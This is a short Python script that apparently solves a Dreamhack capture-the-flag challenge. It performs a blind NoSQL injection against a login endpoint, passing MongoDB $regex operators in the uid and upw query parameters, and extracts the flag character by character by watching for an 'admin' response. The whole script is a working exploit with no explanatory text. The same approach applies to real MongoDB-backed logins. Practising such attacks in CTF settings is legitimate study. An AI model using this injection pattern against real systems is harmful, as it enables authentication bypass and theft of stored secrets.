import requests, string
HOST = 'http://host1.dreamhack.games:16090'
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'
flag = ''
for i in range(32):
	for ch in ALPHANUMERIC:
		response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
		print(response.text)
		if response.text == SUCCESS:
			flag += ch
			break
	print(f'FLAG: DH{{{flag}}}')
